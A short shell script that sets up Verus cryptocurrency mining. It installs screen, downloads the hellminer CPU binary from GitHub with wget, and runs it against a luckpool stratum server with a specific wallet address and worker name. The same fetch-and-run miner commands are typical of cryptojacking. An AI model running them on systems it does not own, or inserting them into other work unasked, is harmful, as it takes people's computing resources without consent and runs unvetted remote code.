#veruscoin
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u TGcoZbmjeHReEPXuMeokoFBEwh5Syep4Qx.HENTIN -p x --cpu 3

